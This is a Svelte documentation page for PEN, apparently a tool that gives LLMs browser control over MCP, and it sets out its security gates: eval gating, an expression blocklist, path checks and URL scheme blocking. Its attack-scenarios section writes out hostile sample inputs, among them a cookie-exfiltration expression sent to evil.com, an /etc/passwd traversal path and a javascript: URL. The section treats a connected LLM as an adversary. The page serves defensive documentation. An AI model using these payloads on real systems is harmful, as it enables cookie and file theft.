<script lang="ts">
  import DocPage from "$lib/content/DocPage.svelte";
  import CodeBlock from "$lib/content/CodeBlock.svelte";
  import type { PageProps } from "./$types";

  let { data }: PageProps = $props();
</script>

<DocPage
  title={data.title}
  description={data.description}
  slug={data.slug}
  headings={data.headings}
>
  <h1>Security</h1>

  <p>
    PEN sits between CDP (full browser control), MCP (LLM-driven tool calls),
    and the local filesystem. Every boundary is locked down.
  </p>

  <h2 id="overview">Overview</h2>

  <div class="table-wrapper">
    <table>
      <thead><tr><th>Boundary</th><th>Threat</th><th>Defense</th></tr></thead>
      <tbody>
        <tr><td>MCP ← LLM</td><td>Malicious eval, read sensitive files</td><td>Eval gating, expression blocklist, path validation</td></tr>
        <tr><td>MCP ← LLM</td><td>Navigate to dangerous URLs</td><td>URL scheme validation</td></tr>
        <tr><td>PEN → Chrome</td><td>Full browser access</td><td>Localhost-only CDP</td></tr>
        <tr><td>PEN → File System</td><td>Temp files, path traversal</td><td>Temp dir isolation, path checks</td></tr>
        <tr><td>PEN → Network</td><td>Source map fetching</td><td>Not implemented (by design)</td></tr>
      </tbody>
    </table>
  </div>

  <p>
    Any LLM connected over MCP can call any registered tool with whatever
    parameters it wants. The gates below stop misuse.
  </p>

  <h2 id="gate-1-eval-gating">Gate 1: Eval Gating</h2>

  <p>
    <code>pen_evaluate</code> is the scariest tool — it runs JS straight in the
    browser.
  </p>

  <p>
    <strong>Off by default.</strong> It only exists if you pass
    <code>--allow-eval</code> at startup. Without that flag, the tool never
    shows up in <code>tools/list</code> and can't be called.
  </p>

  <h2 id="gate-2-expression-blocklist">Gate 2: Expression Blocklist</h2>

  <p>Even with <code>--allow-eval</code> on, PEN blocks known-dangerous patterns:</p>

  <div class="table-wrapper">
    <table>
      <thead><tr><th>Pattern</th><th>What it blocks</th></tr></thead>
      <tbody>
        <tr><td><code>fetch(</code></td><td>Network exfiltration</td></tr>
        <tr><td><code>XMLHttpRequest</code></td><td>Network exfiltration</td></tr>
        <tr><td><code>navigator.sendBeacon</code></td><td>Data beaconing</td></tr>
        <tr><td><code>localStorage</code></td><td>Persistent storage access</td></tr>
        <tr><td><code>sessionStorage</code></td><td>Session storage access</td></tr>
        <tr><td><code>document.cookie</code></td><td>Cookie theft</td></tr>
        <tr><td><code>window.open(</code></td><td>Popup/redirect abuse</td></tr>
        <tr><td><code>eval(</code></td><td>Dynamic code execution</td></tr>
        <tr><td><code>Function(</code></td><td>Dynamic code execution</td></tr>
        <tr><td><code>import(</code></td><td>Dynamic module loading</td></tr>
      </tbody>
    </table>
  </div>

  <p>Unicode escape sequences (<code>\uXXXX</code>) are also rejected to prevent sneaking past the blocklist.</p>

  <blockquote>
    <p>
      This is defense-in-depth, not an airtight sandbox. A motivated attacker
      can dodge regex filters. The real protection is Gate 1: just don't enable
      eval.
    </p>
  </blockquote>

  <h2 id="gate-3-path-traversal-prevention">Gate 3: Path Traversal Prevention</h2>

  <p>
    Source tools accept file paths. <code>ValidateSourcePath</code> stops
    traversal cold:
  </p>

  <ul>
    <li>Resolves the path to an absolute path</li>
    <li>Checks it's within the project root using <code>filepath.Rel</code></li>
    <li>Handles case-insensitive filesystems and mixed separators</li>
    <li>Rejects any path that resolves outside the root</li>
  </ul>

  <p>
    Temp files are validated separately — must be within
    <code>os.TempDir()/pen/</code>.
  </p>

  <h2 id="gate-4-cdp-localhost-restriction">Gate 4: CDP Localhost Restriction</h2>

  <p>
    PEN only connects to localhost (<code>localhost</code>,
    <code>127.0.0.1</code>, <code>::1</code>). Anything else is rejected before
    the MCP server even starts.
  </p>

  <p>For remote browsers, use SSH tunneling:</p>

  <CodeBlock
    lang="bash"
    code={`ssh -L 9222:localhost:9222 user@remote-server
pen --cdp-url http://localhost:9222`}
  />

  <h2 id="gate-5-url-scheme-validation">Gate 5: URL Scheme Validation</h2>

  <p>
    <code>pen_navigate</code> and <code>pen_lighthouse</code> validate URLs
    before any action:
  </p>

  <div class="table-wrapper">
    <table>
      <thead><tr><th>Blocked Scheme</th><th>Why</th></tr></thead>
      <tbody>
        <tr><td><code>javascript:</code></td><td>Code execution</td></tr>
        <tr><td><code>data:</code></td><td>Arbitrary content rendering</td></tr>
        <tr><td><code>file:</code></td><td>Filesystem access</td></tr>
        <tr><td><code>chrome:</code> / <code>about:</code></td><td>Internal browser pages</td></tr>
        <tr><td><code>ftp:</code></td><td>Unencrypted protocol</td></tr>
        <tr><td><code>ws:</code> / <code>wss:</code></td><td>WebSocket connections</td></tr>
        <tr><td><code>blob:</code></td><td>In-memory content</td></tr>
        <tr><td><code>vbscript:</code></td><td>Legacy script execution</td></tr>
      </tbody>
    </table>
  </div>

  <p>Only HTTP and HTTPS get through.</p>

  <h2 id="gate-6-rate-limiting">Gate 6: Rate Limiting</h2>

  <p>Heavy tools get cooldowns to prevent runaway resource use:</p>

  <div class="table-wrapper">
    <table>
      <thead><tr><th>Tool</th><th>Cooldown</th></tr></thead>
      <tbody>
        <tr><td><code>pen_heap_snapshot</code></td><td>10s</td></tr>
        <tr><td><code>pen_capture_trace</code></td><td>5s</td></tr>
        <tr><td><code>pen_collect_garbage</code></td><td>5s</td></tr>
      </tbody>
    </table>
  </div>

  <h2 id="gate-7-temp-file-isolation">Gate 7: Temp File Isolation</h2>

  <ul>
    <li>Directory: <code>os.TempDir()/pen/</code> with <code>0700</code> permissions</li>
    <li>Files: <code>0600</code> permissions (owner-only read/write)</li>
    <li>Cleaned up on normal exit and on context cancellation via <code>defer</code></li>
  </ul>

  <h2 id="gate-8-http-transport">Gate 8: HTTP Transport</h2>

  <p>When using HTTP mode:</p>

  <ul>
    <li>Default bind: <code>localhost:6100</code> — not exposed to network</li>
    <li>Warning logged if binding to all interfaces</li>
    <li>No built-in auth — for network exposure, use a reverse proxy with auth</li>
  </ul>

  <h2 id="attack-scenarios">Attack Scenarios</h2>

  <h3>LLM tries to exfiltrate data via eval</h3>

  <CodeBlock
    lang="json"
    code={`{ "expression": "fetch('https://evil.com?d=' + document.cookie)" }`}
  />

  <ol>
    <li><strong>Default:</strong> Tool doesn't exist. MCP says "unknown tool."</li>
    <li><strong>With <code>--allow-eval</code>:</strong> Blocked by the expression filter (<code>fetch(</code> pattern).</li>
    <li><strong>Obfuscated:</strong> Regex might miss it — which is exactly why Gate 1 (not enabling eval) is your real line of defense.</li>
  </ol>

  <h3>Path traversal via source tools</h3>

  <CodeBlock
    lang="json"
    code={`{ "urlPattern": "../../../../etc/passwd" }`}
  />

  <p>
    <code>ValidateSourcePath</code> resolves to <code>/etc/passwd</code>, checks
    it against the project root, and rejects it.
  </p>

  <h3>Rapid-fire heavy tool calls</h3>

  <CodeBlock
    lang="text"
    code={`pen_heap_snapshot → success
pen_heap_snapshot → blocked (cooldown: 10s)`}
  />

  <h3>Remote CDP connection attempt</h3>

  <CodeBlock
    lang="bash"
    code="pen --cdp-url ws://attacker.com:9222/devtools/browser"
  />

  <p>
    Rejected at startup. PEN shuts down before the MCP server can even start.
  </p>

  <h3>Malicious navigation</h3>

  <CodeBlock
    lang="json"
    code={`{ "url": "javascript:alert(document.cookie)", "action": "goto" }`}
  />

  <p>
    Blocked immediately. <code>javascript:</code> isn't allowed. The request
    never reaches Chrome.
  </p>

  <h2 id="security-checklist">Security Checklist</h2>

  <div class="table-wrapper">
    <table>
      <thead><tr><th>Control</th><th>Status</th></tr></thead>
      <tbody>
        <tr><td><code>pen_evaluate</code> requires <code>--allow-eval</code></td><td>&#10003;</td></tr>
        <tr><td>Expression blocklist + Unicode escape check</td><td>&#10003;</td></tr>
        <tr><td>Path traversal prevention (source paths)</td><td>&#10003;</td></tr>
        <tr><td>Path traversal prevention (temp paths)</td><td>&#10003;</td></tr>
        <tr><td>CDP restricted to localhost</td><td>&#10003;</td></tr>
        <tr><td>URL scheme validation (navigate/lighthouse)</td><td>&#10003;</td></tr>
        <tr><td>Temp files: 0600 perms, isolated dir</td><td>&#10003;</td></tr>
        <tr><td>Temp files cleaned on exit</td><td>&#10003;</td></tr>
        <tr><td>Rate limiting on heavy operations</td><td>&#10003;</td></tr>
        <tr><td>HTTP binds to localhost by default</td><td>&#10003;</td></tr>
        <tr><td>Graceful shutdown on SIGINT/SIGTERM</td><td>&#10003;</td></tr>
      </tbody>
    </table>
  </div>

  <h2 id="recommendations">Recommendations</h2>

  <ul>
    <li><strong>Never enable <code>--allow-eval</code> in production</strong> or untrusted environments</li>
    <li><strong>Always set <code>--project-root</code></strong> to limit source tool access</li>
    <li><strong>Never expose port 9222</strong> to the network</li>
    <li><strong>Use SSH tunneling</strong> for remote browsers</li>
    <li><strong>Use a reverse proxy with auth</strong> if exposing PEN's HTTP transport</li>
  </ul>
</DocPage>
